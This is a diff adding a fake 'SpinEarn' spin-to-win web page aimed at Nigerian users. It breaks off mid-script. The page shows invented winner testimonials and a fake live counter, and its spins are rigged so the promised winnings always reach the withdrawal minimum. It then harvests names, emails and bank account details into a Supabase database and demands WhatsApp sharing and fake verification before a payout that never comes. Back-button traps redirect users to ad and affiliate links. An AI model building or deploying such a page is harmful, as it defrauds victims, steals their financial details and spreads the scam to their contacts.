@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>SpinEarn — Spin & Win Real Cash</title>
+<meta name="robots" content="noindex">
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+:root{
+  --bg:#0a0a0f;
+  --bg2:#13131a;
+  --card:#1a1a24;
+  --card2:#20202c;
+  --line:rgba(255,255,255,.08);
+  --gold:#FFC700;
+  --gold2:#FFE066;
+  --purple:#8B5CF6;
+  --green:#00E676;
+  --red:#FF3D71;
+  --w:#fff;
+  --text:#A0A0B8;
+  --muted:#5C5C70;
+}
+body{
+  font-family:'Manrope',sans-serif;
+  background:var(--bg);
+  color:var(--w);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+.mono{font-family:'DM Mono',monospace;}
+.page-wrap{max-width:480px;margin:0 auto;}
+.screen{display:none;min-height:100vh;padding:20px;}
+.screen.active{display:block;}
+
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+@keyframes glow{0%,100%{box-shadow:0 0 20px rgba(255,199,0,.3);}50%{box-shadow:0 0 40px rgba(255,199,0,.6);}}
+@keyframes popIn{0%{transform:scale(0.5);opacity:0;}60%{transform:scale(1.1);}100%{transform:scale(1);opacity:1;}}
+@keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+
+/* ===== LANDING ===== */
+.land-hero{text-align:center;padding:24px 0 16px;}
+.land-logo{font-size:38px;font-weight:900;letter-spacing:-1px;margin-bottom:6px;}
+.land-logo span{color:var(--gold);}
+.land-tag{font-size:13px;color:var(--text);margin-bottom:24px;}
+
+.wheel-preview{width:220px;height:220px;margin:0 auto 24px;position:relative;}
+.wheel-preview-img{width:100%;height:100%;border-radius:50%;position:relative;overflow:hidden;border:6px solid var(--gold);box-shadow:0 0 40px rgba(255,199,0,.35);animation:spin 8s linear infinite;}
+.wheel-seg{position:absolute;width:50%;height:50%;transform-origin:bottom right;left:0;top:0;}
+.wheel-pointer{position:absolute;top:-14px;left:50%;transform:translateX(-50%);font-size:28px;z-index:10;filter:drop-shadow(0 2px 4px rgba(0,0,0,.4));}
+.wheel-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:50px;height:50px;background:var(--gold);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;z-index:5;border:3px solid var(--bg);}
+
+.land-headline{font-size:24px;font-weight:900;line-height:1.3;margin-bottom:10px;}
+.land-headline .hl-gold{color:var(--gold);}
+.land-sub{font-size:13px;color:var(--text);margin-bottom:24px;line-height:1.6;}
+
+/* LIVE COUNTER */
+.live-counter{background:rgba(255,199,0,.08);border:1px solid rgba(255,199,0,.2);border-radius:12px;padding:12px 16px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;}
+.lc-left{display:flex;align-items:center;gap:8px;}
+.lc-dot{width:8px;height:8px;border-radius:50%;background:var(--gold);animation:blink 1.2s infinite;}
+.lc-label{font-size:11px;color:var(--text);font-weight:600;}
+.lc-amount{font-size:18px;font-weight:900;color:var(--gold);font-family:'DM Mono',monospace;}
+
+.btn-start{width:100%;padding:18px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;margin-bottom:16px;box-shadow:0 8px 24px rgba(255,199,0,.25);animation:glow 2.5s infinite;}
+
+.land-trust{display:flex;justify-content:space-between;gap:8px;margin-bottom:24px;}
+.lt-item{flex:1;text-align:center;font-size:11px;color:var(--text);background:var(--card);border:1px solid var(--line);border-radius:10px;padding:10px 6px;}
+
+/* TESTIMONIALS */
+.testimonials{width:100%;margin-bottom:24px;}
+.testi-title{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;}
+.testi-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;margin-bottom:10px;}
+.tc-top{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+.tc-av{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000;flex-shrink:0;}
+.tc-name{font-size:13px;font-weight:700;}
+.tc-loc{font-size:11px;color:var(--text);}
+.tc-stars{color:var(--gold);font-size:13px;margin-bottom:6px;}
+.tc-text{font-size:12px;color:var(--text);line-height:1.6;}
+.tc-earned{font-size:12px;font-weight:700;color:var(--green);margin-top:6px;}
+
+/* ===== FORM ELEMENTS (shared) ===== */
+.scr-title{font-size:22px;font-weight:800;margin-bottom:6px;}
+.scr-sub{font-size:13px;color:var(--text);margin-bottom:24px;line-height:1.6;}
+.form-group{margin-bottom:16px;}
+.form-label{font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px;display:block;text-transform:uppercase;letter-spacing:1px;}
+.form-input{width:100%;padding:15px;background:var(--card);border:1px solid var(--line);border-radius:12px;color:var(--w);font-size:15px;font-family:'Manrope',sans-serif;}
+.form-input:focus{outline:none;border-color:var(--gold);}
+.form-input::placeholder{color:var(--muted);}
+.btn-primary{width:100%;padding:16px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;margin-top:8px;}
+.btn-primary:disabled{opacity:.5;}
+.back-link{display:inline-flex;align-items:center;gap:6px;color:var(--text);font-size:13px;margin-bottom:20px;cursor:pointer;background:none;border:none;font-family:inherit;}
+
+/* ===== LOADING ===== */
+.ld-wrap{text-align:center;padding-top:60px;}
+.ld-spinner{width:60px;height:60px;border:4px solid var(--card);border-top-color:var(--gold);border-radius:50%;margin:0 auto 24px;animation:spin 1s linear infinite;}
+.ld-title{font-size:18px;font-weight:800;margin-bottom:24px;}
+.ld-step{display:flex;align-items:center;gap:12px;padding:12px 16px;background:var(--card);border-radius:10px;margin-bottom:8px;text-align:left;opacity:.4;transition:all .3s;}
+.ld-step.done{opacity:1;border:1px solid rgba(0,230,118,.3);}
+.ld-step-dot{width:22px;height:22px;border-radius:50%;background:var(--card2);display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;}
+.ld-step.done .ld-step-dot{background:var(--green);color:#000;}
+.ld-step-text{font-size:13px;}
+.ld-progress{width:100%;height:6px;background:var(--card);border-radius:4px;overflow:hidden;margin-top:20px;}
+.ld-fill{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));width:0%;transition:width .4s;}
+
+/* ===== DASHBOARD / SPIN ===== */
+.dash-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
+.dash-greet{font-size:18px;font-weight:800;}
+.dash-greet span{color:var(--gold);}
+.dash-balance-card{background:linear-gradient(135deg,#1a1a2e,#16161f);border:1px solid rgba(255,199,0,.2);border-radius:18px;padding:20px;margin-bottom:24px;text-align:center;}
+.dbc-label{font-size:11px;color:var(--text);text-transform:uppercase;letter-spacing:2px;margin-bottom:6px;}
+.dbc-amount{font-size:34px;font-weight:900;font-family:'DM Mono',monospace;color:var(--gold);}
+.dbc-spins{font-size:12px;color:var(--text);margin-top:8px;}
+.dbc-spins strong{color:var(--green);}
+
+.wheel-stage{position:relative;width:280px;height:280px;margin:0 auto 24px;}
+.wheel-disc{width:100%;height:100%;border-radius:50%;position:relative;border:8px solid var(--gold);box-shadow:0 0 50px rgba(255,199,0,.3),inset 0 0 30px rgba(0,0,0,.4);transition:transform 4s cubic-bezier(.17,.67,.12,.99);background:#1a1a24;}
+.wheel-seg-label{position:absolute;font-size:13px;font-weight:800;color:#000;font-family:'DM Mono',monospace;text-shadow:0 1px 2px rgba(255,255,255,.3);}
+.wheel-pointer-main{position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-size:36px;z-index:10;filter:drop-shadow(0 3px 6px rgba(0,0,0,.5));}
+.wheel-center-main{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:64px;height:64px;background:radial-gradient(circle,var(--gold2),var(--gold));border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;z-index:5;border:4px solid var(--bg);box-shadow:0 4px 12px rgba(0,0,0,.4);}
+
+.btn-spin{width:100%;padding:18px;background:linear-gradient(135deg,var(--purple),#A78BFA);color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;margin-bottom:12px;box-shadow:0 8px 24px rgba(139,92,246,.3);}
+.btn-spin:disabled{opacity:.4;cursor:not-allowed;box-shadow:none;}
+.btn-spin:active{transform:scale(0.98);}
+
+.spin-result{display:none;background:rgba(0,230,118,.1);border:1px solid rgba(0,230,118,.3);border-radius:14px;padding:16px;text-align:center;margin-bottom:16px;animation:popIn .5s ease;}
+.spin-result.show{display:block;}
+.sr-amount{font-size:28px;font-weight:900;color:var(--green);font-family:'DM Mono',monospace;}
+.sr-label{font-size:12px;color:var(--text);margin-top:4px;}
+
+/* ===== EARNINGS ===== */
+.earn-hero{text-align:center;padding:20px 0;}
+.earn-icon{font-size:48px;margin-bottom:8px;animation:float 3s ease-in-out infinite;}
+.earn-amount{font-size:40px;font-weight:900;font-family:'DM Mono',monospace;color:var(--gold);margin-bottom:4px;}
+.earn-label{font-size:13px;color:var(--text);margin-bottom:24px;}
+.earn-breakdown{background:var(--card);border-radius:14px;padding:16px;margin-bottom:20px;}
+.eb-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line);font-size:13px;}
+.eb-row:last-child{border-bottom:none;font-weight:800;}
+.eb-label{color:var(--text);}
+.eb-value{font-family:'DM Mono',monospace;font-weight:700;}
+
+/* ===== WITHDRAW ===== */
+.bank-options{display:flex;gap:10px;margin-bottom:20px;}
+.bank-opt{flex:1;background:var(--card);border:2px solid var(--line);border-radius:12px;padding:16px 10px;text-align:center;cursor:pointer;transition:all .2s;}
+.bank-opt.selected{border-color:var(--gold);background:rgba(255,199,0,.08);}
+.bank-opt-name{font-size:15px;font-weight:800;}
+.bank-opt-sub{font-size:10px;color:var(--text);margin-top:2px;}
+
+/* ===== SHARE WALL ===== */
+.sw-hero{text-align:center;padding:20px 0;}
+.sw-icon{font-size:48px;margin-bottom:12px;}
+.sw-title{font-size:20px;font-weight:800;margin-bottom:10px;}
+.sw-sub{font-size:13px;color:var(--text);line-height:1.7;margin-bottom:24px;}
+.sw-progress-wrap{background:var(--card);border-radius:14px;padding:16px;margin-bottom:20px;}
+.sw-progress-bar{width:100%;height:10px;background:var(--bg2);border-radius:6px;overflow:hidden;margin-bottom:8px;}
+.sw-fill{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));width:0%;transition:width .4s;}
+.sw-status{font-size:12px;color:var(--text);text-align:center;}
+.btn-share{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;}
+
+.share-fail{background:rgba(255,61,113,.1);border:1px solid rgba(255,61,113,.3);border-radius:12px;padding:14px;margin-bottom:14px;text-align:center;animation:shake .5s ease both;}
+.sf-title{font-size:14px;font-weight:800;color:var(--red);margin-bottom:4px;}
+.sf-sub{font-size:12px;color:var(--text);}
+
+/* ===== KYC ===== */
+.kyc-hero{text-align:center;padding:20px 0;}
+.kyc-icon{font-size:48px;margin-bottom:12px;}
+.kyc-title{font-size:20px;font-weight:800;margin-bottom:10px;}
+.kyc-sub{font-size:13px;color:var(--text);line-height:1.7;margin-bottom:24px;}
+.kyc-card{background:var(--card);border-radius:14px;padding:16px;margin-bottom:20px;}
+.kyc-row{display:flex;justify-content:space-between;padding:8px 0;font-size:13px;}
+.kyc-row .kr-label{color:var(--text);}
+.btn-kyc{width:100%;padding:18px;background:linear-gradient(135deg,var(--green),#00C853);color:#000;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;}
+
+/* ===== PROCESSING ===== */
+.pp-wrap{text-align:center;padding-top:60px;}
+.pp-icon{font-size:60px;margin-bottom:16px;animation:float 2.5s ease-in-out infinite;}
+.pp-title{font-size:20px;font-weight:800;margin-bottom:8px;}
+.pp-sub{font-size:13px;color:var(--text);margin-bottom:24px;line-height:1.6;}
+.pp-card{background:var(--card);border-radius:14px;padding:18px;text-align:left;margin-bottom:20px;}
+.pp-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--line);font-size:13px;}
+.pp-row:last-child{border-bottom:none;}
+.pp-row .pr-label{color:var(--text);}
+.pp-note{font-size:12px;color:var(--text);background:rgba(255,199,0,.08);border:1px solid rgba(255,199,0,.2);border-radius:10px;padding:12px;line-height:1.6;}
+
+/* ===== MODALS / TOASTS ===== */
+.earn-toast{position:fixed;top:-100px;left:50%;transform:translateX(-50%);background:var(--green);color:#000;padding:12px 24px;border-radius:30px;font-weight:800;font-size:14px;z-index:9999;transition:top .4s cubic-bezier(.34,1.56,.64,1);box-shadow:0 8px 24px rgba(0,230,118,.3);}
+.earn-toast.show{top:20px;}
+.toast{position:fixed;bottom:-100px;left:50%;transform:translateX(-50%);background:var(--card2);color:var(--w);padding:12px 20px;border-radius:12px;font-size:13px;z-index:9999;transition:bottom .4s;border:1px solid var(--line);max-width:90%;text-align:center;}
+.toast.show{bottom:20px;}
+
+.activity-toast{position:fixed;top:16px;left:16px;right:16px;max-width:340px;margin:0 auto;background:var(--card2);border:1px solid rgba(255,199,0,.25);border-radius:14px;padding:10px 14px;display:flex;align-items:center;gap:10px;transform:translateY(-100px);opacity:0;transition:all .5s cubic-bezier(.34,1.56,.64,1);z-index:9990;pointer-events:none;}
+.activity-toast.show{transform:translateY(0);opacity:1;}
+.at-av{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;color:#000;}
+.at-body{flex:1;}
+.at-name{font-size:12px;font-weight:700;color:var(--w);}
+.at-action{font-size:11px;color:var(--text);}
+
+/* BACK WARNING */
+#backWarn{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:99998;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(12px);}
+#backWarn.show{display:flex;}
+.bw-card{width:100%;max-width:380px;background:var(--card2);border:2px solid var(--gold);border-radius:18px;padding:24px 20px;text-align:center;}
+.bw-icon{font-size:46px;display:block;margin-bottom:12px;}
+.bw-title{font-size:20px;font-weight:800;color:var(--gold);margin-bottom:10px;}
+.bw-body{font-size:13px;color:var(--text);line-height:1.75;margin-bottom:18px;}
+.bw-body strong{color:var(--w);}
+.btn-bw-stay{width:100%;padding:14px;background:var(--gold);color:#000;border:none;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:8px;}
+.btn-bw-leave{width:100%;padding:10px;background:transparent;color:var(--muted);border:none;font-size:13px;cursor:pointer;}
+
+/* SECOND CHANCE */
+#secondChance{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:99999;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(12px);}
+#secondChance.show{display:flex;}
+.sc-card{width:100%;max-width:380px;background:var(--card2);border:2px solid var(--green);border-radius:18px;padding:24px 20px;text-align:center;}
+.sc-icon{font-size:46px;display:block;margin-bottom:12px;}
+.sc-title{font-size:19px;font-weight:800;color:var(--green);margin-bottom:10px;}
+.sc-body{font-size:13px;color:var(--text);line-height:1.75;margin-bottom:18px;}
+.sc-body strong{color:var(--w);}
+.btn-sc-claim{width:100%;padding:14px;background:var(--green);color:#000;border:none;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:8px;}
+.btn-sc-close{width:100%;padding:10px;background:transparent;color:var(--muted);border:none;font-size:13px;cursor:pointer;}
+
+/* SPIN CONFETTI */
+.confetti{position:fixed;inset:0;pointer-events:none;z-index:99997;overflow:hidden;}
+.confetti-piece{position:absolute;width:8px;height:14px;opacity:0;animation:confettiFall 2.5s ease-in forwards;}
+@keyframes confettiFall{0%{transform:translateY(-20px) rotate(0deg);opacity:1;}100%{transform:translateY(100vh) rotate(720deg);opacity:0;}}
+</style>
+</head>
+<body>
+
+<div id="backWarn">
+  <div class="bw-card">
+    <span class="bw-icon">🎰</span>
+    <div class="bw-title">Your Winnings Will Be Lost!</div>
+    <div class="bw-body">You have <strong id="bwAmount">₦0</strong> pending. Going back will cancel your withdrawal request. Stay and complete the process.</div>
+    <button class="btn-bw-stay" onclick="closeBackWarn()">✅ Continue & Get Paid</button>
+    <button class="btn-bw-leave" onclick="leaveAnyway()">I don't want my money</button>
+  </div>
+</div>
+
+<div id="secondChance">
+  <div class="sc-card">
+    <span class="sc-icon">🎁</span>
+    <div class="sc-title">Wait! One Last Thing...</div>
+    <div class="sc-body">Before you go, claim an <strong>instant ₦2,000 bonus</strong> — no verification, no sharing required. Just one quick step.</div>
+    <button class="btn-sc-claim" onclick="claimSecondChance()">🎁 Claim ₦2,000 Now</button>
+    <button class="btn-sc-close" onclick="closeSecondChance()">No thanks, I'll leave</button>
+  </div>
+</div>
+
+<div class="earn-toast" id="earnToast">+₦12,000 Won! 🎰</div>
+<div class="toast" id="toast"></div>
+<div class="activity-toast" id="activityToast">
+  <div class="at-av" id="atAv" style="background:#00C853;">AO</div>
+  <div class="at-body">
+    <div class="at-name" id="atName">Adaeze</div>
+    <div class="at-action" id="atAction">just won ₦15,000 🎰</div>
+  </div>
+</div>
+<div class="confetti" id="confetti"></div>
+
+<div class="page-wrap">
+
+<!-- ===== LANDING ===== -->
+<div class="screen active" id="landing">
+  <div class="land-hero">
+    <div class="land-logo">Spin<span>Earn</span></div>
+    <div class="land-tag">Spin the wheel. Win real cash. Withdraw today.</div>
+
+    <div class="wheel-preview">
+      <div class="wheel-pointer">📍</div>
+      <div class="wheel-preview-img" id="previewWheel"></div>
+      <div class="wheel-center">🎰</div>
+    </div>
+
+    <div class="land-headline">Every spin wins <span class="hl-gold">real money</span>.<br>No losers. Ever.</div>
+    <div class="land-sub">Get 3 free spins when you sign up. Each spin pays between ₦5,000 and ₦20,000 — straight to your balance.</div>
+  </div>
+
+  <div class="live-counter">
+    <div class="lc-left">
+      <div class="lc-dot"></div>
+      <div class="lc-label">Total won by Nigerians today</div>
+    </div>
+    <div class="lc-amount" id="liveCounter">₦0</div>
+  </div>
+
+  <button class="btn-start" onclick="goScreen('register')">🎰 Spin Now — Free</button>
+
+  <div class="land-trust">
+    <div class="lt-item">✅ Free to join</div>
+    <div class="lt-item">🎰 3 free spins</div>
+    <div class="lt-item">💸 Instant payout</div>
+  </div>
+
+  <div class="testimonials">
+    <div class="testi-title">RECENT WINNERS</div>
+    <div class="testi-card">
+      <div class="tc-top">
+        <div class="tc-av" style="background:#FF6B35;">AO</div>
+        <div><div class="tc-name">Adaeze Obi</div><div class="tc-loc">📍 Lagos</div></div>
+      </div>
+      <div class="tc-stars">★★★★★</div>
+      <div class="tc-text">"I spun 3 times and won ₦45,000! Couldn't believe it was real until the money showed in my balance. Withdrew to OPay same day."</div>
+      <div class="tc-earned">Won: ₦45,000 🎰</div>
+    </div>
+    <div class="testi-card">
+      <div class="tc-top">
+        <div class="tc-av" style="background:#2979FF;">EM</div>
+        <div><div class="tc-name">Emeka Madu</div><div class="tc-loc">📍 Abuja</div></div>
+      </div>
+      <div class="tc-stars">★★★★★</div>
+      <div class="tc-text">"Took less than 2 minutes. Spin, spin, spin — ₦50,000 in my balance. This is the easiest money I've ever made online."</div>
+      <div class="tc-earned">Won: ₦50,000 🎰</div>
+    </div>
+    <div class="testi-card">
+      <div class="tc-top">
+        <div class="tc-av" style="background:#AA00FF;">FB</div>
+        <div><div class="tc-name">Fatima Bello</div><div class="tc-loc">📍 Kano</div></div>
+      </div>
+      <div class="tc-stars">★★★★★</div>
+      <div class="tc-text">"My friend sent me the link and I thought it was a joke. Spun my free 3 and got ₦42,000. Already withdrawn to PalmPay 🎉"</div>
+      <div class="tc-earned">Won: ₦42,000 🎰</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== REGISTER ===== -->
+<div class="screen" id="register">
+  <button class="back-link" onclick="goScreen('landing')">← Back</button>
+  <div class="scr-title">Create Your Account</div>
+  <div class="scr-sub">Sign up to claim your 3 free spins and start winning instantly.</div>
+
+  <div class="form-group">
+    <label class="form-label">Full Name</label>
+    <input class="form-input" id="regName" type="text" placeholder="Enter your full name">
+  </div>
+  <div class="form-group">
+    <label class="form-label">Email Address</label>
+    <input class="form-input" id="regEmail" type="email" placeholder="Enter your email">
+  </div>
+  <div class="form-group">
+    <label class="form-label">Password</label>
+    <input class="form-input" id="regPass" type="password" placeholder="Create a password (min 6 characters)">
+  </div>
+
+  <button class="btn-primary" onclick="doRegister()">Create Account & Spin 🎰</button>
+</div>
+
+<!-- ===== LOADING ===== -->
+<div class="screen" id="loading">
+  <div class="ld-wrap page-wrap">
+    <div class="ld-spinner"></div>
+    <div class="ld-title">Setting up your account...</div>
+    <div class="ld-step" id="ls1"><div class="ld-step-dot">1</div><div class="ld-step-text">Creating your wallet</div></div>
+    <div class="ld-step" id="ls2"><div class="ld-step-dot">2</div><div class="ld-step-text">Loading the wheel</div></div>
+    <div class="ld-step" id="ls3"><div class="ld-step-dot">3</div><div class="ld-step-text">Activating 3 free spins</div></div>
+    <div class="ld-step" id="ls4"><div class="ld-step-dot">4</div><div class="ld-step-text">Almost ready...</div></div>
+    <div class="ld-progress"><div class="ld-fill" id="ldFill"></div></div>
+  </div>
+</div>
+
+<!-- ===== DASHBOARD / SPIN ===== -->
+<div class="screen" id="dashboard">
+  <div class="dash-header">
+    <div class="dash-greet">Hi, <span id="dashName">there!</span></div>
+  </div>
+
+  <div class="dash-balance-card">
+    <div class="dbc-label">Your Balance</div>
+    <div class="dbc-amount mono" id="dashBalance">₦0</div>
+    <div class="dbc-spins">Spins remaining: <strong id="spinsLeft">3</strong></div>
+  </div>
+
+  <div class="spin-result" id="spinResult">
+    <div class="sr-amount" id="srAmount">+₦0</div>
+    <div class="sr-label">Added to your balance! 🎉</div>
+  </div>
+
+  <div class="wheel-stage">
+    <div class="wheel-pointer-main">📍</div>
+    <div class="wheel-disc" id="mainWheel"></div>
+    <div class="wheel-center-main">🎰</div>
+  </div>
+
+  <button class="btn-spin" id="btnSpin" onclick="doSpin()">🎰 SPIN THE WHEEL</button>
+
+  <div id="wdTeaser" style="display:none;">
+    <button class="btn-primary" id="wdTeaserBtn" onclick="goScreen('earnings')">View My Winnings 🎉</button>
+  </div>
+</div>
+
+<!-- ===== EARNINGS ===== -->
+<div class="screen" id="earnings">
+  <button class="back-link" onclick="goScreen('dashboard')">← Back</button>
+  <div class="earn-hero">
+    <div class="earn-icon">🎉</div>
+    <div class="earn-amount mono" id="earnPageAmount">0</div>
+    <div class="earn-label">Total Winnings (₦)</div>
+  </div>
+
+  <div class="earn-breakdown">
+    <div class="eb-row"><span class="eb-label">Spin 1</span><span class="eb-value mono" id="spin1Val">₦0</span></div>
+    <div class="eb-row"><span class="eb-label">Spin 2</span><span class="eb-value mono" id="spin2Val">₦0</span></div>
+    <div class="eb-row"><span class="eb-label">Spin 3</span><span class="eb-value mono" id="spin3Val">₦0</span></div>
+    <div class="eb-row"><span class="eb-label">Total</span><span class="eb-value mono" id="totalEarnBreakdown">₦0</span></div>
+  </div>
+
+  <button class="btn-primary" onclick="tryWithdraw()">Withdraw to Bank →</button>
+</div>
+
+<!-- ===== WITHDRAW ===== -->
+<div class="screen" id="withdraw">
+  <button class="back-link" onclick="goScreen('earnings')">← Back</button>
+  <div class="scr-title">Withdraw Winnings</div>
+  <div class="scr-sub">You're withdrawing <strong id="wdAmount" style="color:var(--gold);">₦0</strong> to your bank account.</div>
+
+  <div class="form-group">
+    <label class="form-label">Select Bank</label>
+    <div class="bank-options">
+      <div class="bank-opt selected" id="bankOpay" onclick="selectBank('opay')">
+        <div class="bank-opt-name">OPay</div>
+        <div class="bank-opt-sub">Mobile Bank</div>
+      </div>
+      <div class="bank-opt" id="bankPalmpay" onclick="selectBank('palmpay')">
+        <div class="bank-opt-name">PalmPay</div>
+        <div class="bank-opt-sub">Mobile Bank</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Account Number</label>
+    <input class="form-input" id="wdAccNo" type="number" placeholder="Enter 10-digit account number" oninput="triggerBankVerify(this.value)">
+  </div>
+  <div id="bankVerifyStatus" style="display:none;margin-top:-8px;margin-bottom:12px;padding:10px 14px;border-radius:10px;font-size:13px;font-weight:700;"></div>
+  <div class="form-group">
+    <label class="form-label">Account Name</label>
+    <input class="form-input" id="wdAccName" type="text" placeholder="Enter your account name">
+  </div>
+
+  <div style="background:rgba(255,199,0,.08);border:1px solid rgba(255,199,0,.2);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:var(--text);line-height:1.6;">
+    🔒 Secure withdrawal. Your bank details are encrypted. Payment processed within 24 hours after verification.
+  </div>
+
+  <button class="btn-primary" onclick="placeWithdrawal()">Confirm Withdrawal</button>
+</div>
+
+<!-- ===== SHARE WALL ===== -->
+<div class="screen" id="sharewall">
+  <div class="sw-hero">
+    <div class="sw-icon">🔒</div>
+    <div class="sw-title" id="swHeroTitle">Verify to Receive ₦0</div>
+    <div class="sw-sub" id="swHeroSub">To process your withdrawal, share SpinEarn with 5 friends to verify your account.</div>
+  </div>
+
+  <div class="sw-progress-wrap">
+    <div class="sw-progress-bar"><div class="sw-fill" id="swFill"></div></div>
+    <div class="sw-status" id="swStatus">Share with 5 friends to unlock withdrawal</div>
+    <div class="sw-status" id="swPct" style="margin-top:4px;font-weight:800;color:var(--gold);">0%</div>
+  </div>
+
+  <button class="btn-share" id="btnShareWA" onclick="doShareWA()">
+    📤 <span id="swBtnText">Share on WhatsApp to Verify</span>
+  </button>
+</div>
+
+<!-- ===== KYC ===== -->
+<div class="screen" id="kyc">
+  <div class="kyc-hero">
+    <div class="kyc-icon">🪪</div>
+    <div class="kyc-title">Final Step: Quick Verification</div>
+    <div class="kyc-sub">Complete a quick identity check to activate instant withdrawal processing.</div>
+  </div>
+
+  <div class="kyc-card">
+    <div class="kyc-row"><span class="kr-label">Amount to receive</span><span class="mono" id="kycAmount">₦0</span></div>
+    <div class="kyc-row"><span class="kr-label">Bank</span><span class="mono" id="kycBank">OPay</span></div>
+    <div class="kyc-row"><span class="kr-label">Status</span><span style="color:var(--gold);">Pending verification</span></div>
+  </div>
+
+  <button class="btn-kyc" onclick="doKYC()">Complete Verification & Receive ₦<span id="kycBtnAmount">0</span> →</button>
+</div>
+
+<!-- ===== PROCESSING ===== -->
+<div class="screen" id="processing">
+  <div class="pp-wrap page-wrap">
+    <div class="pp-icon">⏳</div>
+    <div class="pp-title">Processing Your Payment</div>
+    <div class="pp-sub">Your withdrawal is being processed. This usually takes a few minutes to 24 hours.</div>
+
+    <div class="pp-card">
+      <div class="pp-row"><span class="pr-label">Reference ID</span><span class="mono" id="ppRef">-</span></div>
+      <div class="pp-row"><span class="pr-label">Amount</span><span class="mono" id="ppAmount">₦0</span></div>
+      <div class="pp-row"><span class="pr-label">Bank</span><span class="mono" id="ppBank">-</span></div>
+      <div class="pp-row"><span class="pr-label">Status</span><span style="color:var(--green);">✅ Verified</span></div>
+    </div>
+
+</div>
+
+<script>
+// ===== CONFIG =====
+const SITE = "https://spinearn.xyz"; // TODO: replace with your real domain once purchased
+const AFF = "https://www.effectivecpmnetwork.com/t7jwkt8bc4?key=1d77add4feba7fc9852d1b354879b329";
+const SECOND_CHANCE_OFFER = "https://www.effectivecpmnetwork.com/t7jwkt8bc4?key=1d77add4feba7fc9852d1b354879b329";
+const BACK = "https://omg10.com/4/4105256";
+const REQ = 5;
+const MIN_WITHDRAW = 40000;
+
+// Supabase
+const supabaseClient = supabase.createClient(
+  "https://dtjxcgzpwemdgdeinkcl.supabase.co",
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0anhjZ3pwd2VtZGdkZWlua2NsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MDg0ODQsImV4cCI6MjA5MzQ4NDQ4NH0.kGjtOZfK7onzr-3FVMuSljiJ3emllxtGdepxrFVUPPM"
+);
+async function saveRegistration(name, email){
+  try{ await supabaseClient.from('spinearn_registrations').insert([{ full_name: name, email: email }]); }
+  catch(e){ console.log('Registration save failed:', e); }
+}
+async function saveWithdrawal(name, accNo, bank, amount){
+  try{
+    await supabaseClient.from('spinearn_withdrawals').insert([{
+      account_name: name, account_number: accNo, bank: bank, amount: amount,
+      user_email: (document.getElementById('regEmail')?.value || '').trim()
+    }]);
+  }catch(e){ console.log('Withdrawal save failed:', e); }
+}
+
+// ===== STATE =====
+let userName="", totalBalance=0, currentScreen="landing";
+let spinsLeft=3, spinIndex=0, spinAmounts=[0,0,0], spinBusy=false;
+let swShares=0, selectedBank="opay", shareFailTriggered=false;
+let withdrawalAmount=0, withdrawalBank="opay", withdrawalAcc="";
+
+// 8 wheel segments
+const WHEEL_AMOUNTS=[5000,12000,8000,15000,10000,20000,7000,18000];
+const WHEEL_COLORS=['#FFC700','#8B5CF6','#00E676','#FF6B35','#FFC700','#8B5CF6','#00E676','#FF6B35'];
+const WHEEL_TEXT=['#000','#fff','#000','#000','#000','#fff','#000','#000'];
+
+// Predetermined spin sequences that sum to >=40,000 across 3 spins
+const SEQUENCES=[
